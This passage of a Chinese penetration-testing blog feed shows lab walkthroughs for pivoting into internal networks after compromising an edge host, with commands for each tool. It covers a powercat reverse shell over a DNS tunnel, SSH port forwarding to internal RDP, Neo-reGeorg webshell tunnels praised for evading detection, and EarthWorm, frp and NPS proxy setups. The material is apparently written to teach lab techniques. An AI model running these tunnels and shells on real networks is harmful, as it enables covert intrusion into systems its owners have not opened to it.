src="https://img-blog.csdnimg.cn/20210508133323687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508133349437.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508133413114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里就可以执行命令操作了<br>（2）dnscat+powercat<br>客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\powercat.ps1<br>powercat -c 192.168.43.254 -p 53 -dns aaa.com -e cmd.exe<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508134519124.png" alt="在这里插入图片描述"><br>服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby dnscat2.rb aaa.com -e open --no-cache<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508134537265.png" alt="在这里插入图片描述"><br>收到session</p><p>powercat 也可像nc哪像使用，使用方法都差不多。</p><p>详细学习请参考：<a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><ul><li>ssh协议：<br>创建ssh隧道的常用参数：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">-C ： 压缩传输，提高传输速度。<br>-f ： 将ssh传输转入后台执行，不占用当前的shell。<br>-N ：建立默认连接（建立了连接，但是看不到具体会话）。<br>-g ：允许远程主机连接本地用于转发的端口。<br>-L : 本地端口转发。<br>-R ： 远程端口转发。<br>-D ： 动态转发(socks代理）。<br>-P ：指定ssh端口。<br></code></pre></td></tr></table></figure><p>（1）本地转发<br><img src="https://img-blog.csdnimg.cn/20210508144037174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试目标：跳板机为跳板访问windows2008  3389端口<br>将内网windows主机3389端口映射到攻击机本地端口上。在访问这个本地端口就可以访问目标机的3389端口了<br>攻击执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -L 1111:10.10.10.30:3389 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508144532744.png" alt="在这里插入图片描述"><br>这里要输入跳板机的登录密码<br>成功之后查看本地1111端口是否已经连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -tulnp | grep <span class="hljs-string">&quot;1111&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508144731680.png" alt="在这里插入图片描述"></p><p>在kali中执行 rdesktop 127.0.0.1:1111<br><img src="https://img-blog.csdnimg.cn/20210508144819413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>映射成功</p><p>ssh本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道传输到远端的对应端口。</p><p>（2)远程转发</p><p><img src="https://img-blog.csdnimg.cn/20210508145642940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -R 3333:10.10.10.30:3389 root@192.168.43.254<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508145906561.png" alt="在这里插入图片描述"><br>kali中输入  redesktop 127.0.0.1:3333<br><img src="https://img-blog.csdnimg.cn/20210508150047952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功建立连接</p><p>本地端口转发是将远程主机某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问这个远程服务器指定端口的数据都会通过ssh隧道传输到本地的对应端口。</p><p>（3）动态转发<br><img src="https://img-blog.csdnimg.cn/20210508152101186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在kali中执行如下命令，建立一个动态的socks 4&#x2F;5代理通道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -D 7000 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508152228596.png" alt="在这里插入图片描述"><br>成功后配置proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508152329188.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508153409376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功访问到内网主机</p><p>动态端口映射就是建立一个ssh加密的socks 4&#x2F;5代理通道。任何支持 socks 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><p><strong>2.4 HTTP&#x2F;HTTPS协议</strong><br>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg,meterpreter,tunna等</p><ul><li>reGeorg<br>reGeorg支持ASPX,PHP,JSP等web脚本，并提供了一个Tomcat5版本。<br>这里使用Neo-reGeorg是大佬改版的reGeorg。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！</li></ul><p>实验环境：</p><p><img src="https://img-blog.csdnimg.cn/20210510145053711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210509000148936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将相应脚本文件上传到目标服务器上<br><img src="https://img-blog.csdnimg.cn/2021050900051045.png" alt="在这里插入图片描述"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210510144725669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210510145217247.png" alt="在这里插入图片描述"><br>测试与目标机连通<br><img src="https://img-blog.csdnimg.cn/20210510145321116.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>隧道隐藏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透中拿到一台边缘机器后剩余内网机器不出网的情况很常见，这时我们就需要把内网机器流量转到边缘机器上再进行访问，内网流量转出来的方法很多，在下面就介绍几种常见的方法</p><p><strong>EarhWorm</strong></p><p>ew参数说明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f : 设置连接主机地址。<br>-g : 设置连接端口。<br>-d : 设置反连主机地址。<br>-e : 设置反连端口。<br>-l : 为服务启动打开一个端口。<br>-s :  状态设置功能。<br></code></pre></td></tr></table></figure><p>6中链路状态 -s参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssocksd    rcsocks   rssocks<br>lcx_slave  lcx_tran  lcx_listen<br>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。<br><br>lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。<br><br>lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。<br><br>lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。<br><br>lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。<br><br>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。<br></code></pre></td></tr></table></figure><p>实验环境：<br><img src="https://img-blog.csdnimg.cn/20210511183651865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>EW是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两大核心功能，可以在复杂的网络环境中实现网络穿透。同时EW能够以正向，反向，多级级联等方式建立网络隧道。<br>（1）正向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s ssocksd -l 8888<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210510172723317.png" alt="在这里插入图片描述"><br>在socksCap64添加这个IP地址的代理<br><img src="https://img-blog.csdnimg.cn/20210510172826510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在攻击机上访问内网目标主机：<br><img src="https://img-blog.csdnimg.cn/20210511183932818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>（2）反向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew -s rssocks -d 192.168.43.234 -e 1111<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511185158276.png" alt="在这里插入图片描述"></p><p>在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s rcsocks -l 1008 -e 888<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511185217485.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210511185347436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>更多参考：<a href="https://www.freebuf.com/sectool/259634.html">https://www.freebuf.com/sectool/259634.html</a></p><p><strong>Neo-reGeorg</strong><br>它是由reGeorg经过大佬改版的。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！<br>实验环境：<br><img src="https://img-blog.csdnimg.cn/20210511205417330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511205721691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210511205746823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511205832821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511205854993.png" alt="在这里插入图片描述"><br>测试与目标机连通<br><img src="https://img-blog.csdnimg.cn/202105112059058.png" alt="在这里插入图片描述"><br><strong>frp</strong><br>攻击机设置frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>bind_port = 6666<br></code></pre></td></tr></table></figure><p>运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frps.exe -c frps.ini<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511210815522.png" alt="在这里插入图片描述"></p><p>在边缘机器设置frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.10.3<br>server_port = 6666<br>[http_proxy]<br><span class="hljs-built_in">type</span>=tcp<br>remote_port=7777<br>plugin=socks5<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511211513845.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511211800156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>NPS</strong><br>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">项目地址：https://github.com/ehang-io/nps/releases/tag/v0.26.9 <br></code></pre></td></tr></table></figure><p>服务端配置文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">appname = nps<br><span class="hljs-comment">#Boot mode(dev|pro)</span><br>runmode = dev<br><br><span class="hljs-comment">#HTTP(S) proxy port, no startup if empty</span><br>http_proxy_ip=0.0.0.0<br>http_proxy_port=80     <span class="hljs-comment">#域名代理http代理监听端口</span><br>https_proxy_port=443   <span class="hljs-comment">#域名代理https代理监听端口(一般会修改这两个端口，避免端口冲突)</span><br>https_just_proxy=<span class="hljs-literal">true</span><br><span class="hljs-comment">#default https certificate setting</span><br>https_default_cert_file=conf/server.pem<br>https_default_key_file=conf/server.key<br><br><span class="hljs-comment">##bridge</span><br>bridge_type=tcp      <span class="hljs-comment">#客户端与服务端连接方式kcp或tcp</span><br>bridge_port=8024     <span class="hljs-comment">#服务端客户端通信端口，也就是说客户端通过访问服务端的这个端口可以进行连接</span><br>bridge_ip=0.0.0.0<br><br><span class="hljs-comment"># Public password, which clients can use to connect to the server</span><br><span class="hljs-comment"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br>public_vkey=123      <span class="hljs-comment">#客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</span><br><br><span class="hljs-comment">#Traffic data persistence interval(minute)</span><br><span class="hljs-comment">#Ignorance means no persistence</span><br><span class="hljs-comment">#flow_store_interval=1   #服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</span><br><br><span class="hljs-comment"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7</span><br>log_level=7         <span class="hljs-comment">#日志输出级别</span><br><span class="hljs-comment">#log_path=nps.log</span><br><br><span class="hljs-comment">#Whether to restrict IP access, true or false or ignore</span><br><span class="hljs-comment">#ip_limit=true      #是否限制ip访问，true或false或忽略</span><br><br><span class="hljs-comment">#p2p</span><br><span class="hljs-comment">#p2p_ip=127.0.0.1    #服务端IP，使用p2p模式必填</span><br><span class="hljs-comment">#p2p_port=6000       #p2p模式开启的udp端口</span><br><br><span class="hljs-comment">#web</span><br>web_host=a.o.com<br>web_username=admin   <span class="hljs-comment">#web界面管理账号</span><br>web_password=123     <span class="hljs-comment">#web界面管理密码</span><br>web_port = 8080      <span class="hljs-comment">#web管理端口，通过访问该端口可以访问NPS后台</span><br>web_ip=0.0.0.0<br>web_base_url=        <span class="hljs-comment">#web管理主路径,用于将web管理置于代理子路径后面</span><br>web_open_ssl=<span class="hljs-literal">false</span><br>web_cert_file=conf/server.pem<br>web_key_file=conf/server.key<br><span class="hljs-comment"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="hljs-comment">#web_base_url=/nps</span><br><br><span class="hljs-comment">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="hljs-comment">#Remove comments if needed</span><br><span class="hljs-comment">#auth_key=test       #web api密钥</span><br>auth_crypt_key =1234567812345678    <span class="hljs-comment">#获取服务端authKey时的aes加密密钥，16位</span><br><br><span class="hljs-comment">#allow_ports=9001-9009,10001,11000-12000</span><br><br><span class="hljs-comment">#Web management multi-user login</span><br>allow_user_login=<span class="hljs-literal">false</span><br>allow_user_register=<span class="hljs-literal">false</span><br>allow_user_change_username=<span class="hljs-literal">false</span><br><br><br><span class="hljs-comment">#extension</span><br>allow_flow_limit=<span class="hljs-literal">false</span><br>allow_rate_limit=<span class="hljs-literal">false</span><br>allow_tunnel_num_limit=<span class="hljs-literal">false</span><br>allow_local_proxy=<span class="hljs-literal">false</span><br>allow_connection_num_limit=<span class="hljs-literal">false</span><br>allow_multi_ip=<span class="hljs-literal">false</span><br>system_info_display=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#cache</span><br>http_cache=<span class="hljs-literal">false</span><br>http_cache_length=100<br><br><span class="hljs-comment">#get origin ip</span><br>http_add_origin_header=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#pprof debug options</span><br><span class="hljs-comment">#pprof_ip=0.0.0.0       #debug pprof 服务端IP</span><br><span class="hljs-comment">#pprof_port=9999        #debug pprof 端口</span><br><br><span class="hljs-comment">#client disconnect timeout</span><br>disconnect_timeout=60   <span class="hljs-comment">#客户端连接超时，单位 5s，默认值 60，即 300s = 5mins</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511234440814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行即可：<br><img src="https://img-blog.csdnimg.cn/20210511234539451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录web界面   admin&#x2F;123<br>配置<br><img src="https://img-blog.csdnimg.cn/2021051123462283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511234702300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击添加<br><img src="https://img-blog.csdnimg.cn/20210511234729659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511234901339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>客户端配置文件：</p><p>友情提示:这里将配置文件写出来主要是为了让大家了解配置文件的内容，如果觉得配置文件太过繁琐，大多数情况下只需要关注server_addr、conn_type、和vkey这三个参数即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr=127.0.0.1:8024<br>conn_type=tcp<br>vkey=123<br>auto_reconnection=<span class="hljs-literal">true</span><br>max_conn=1000<br>flow_limit=1000<br>rate_limit=1000<br>basic_username=11<br>basic_password=3<br>web_username=user<br>web_password=1234<br>crypt=<span class="hljs-literal">true</span><br>compress=<span class="hljs-literal">true</span><br><span 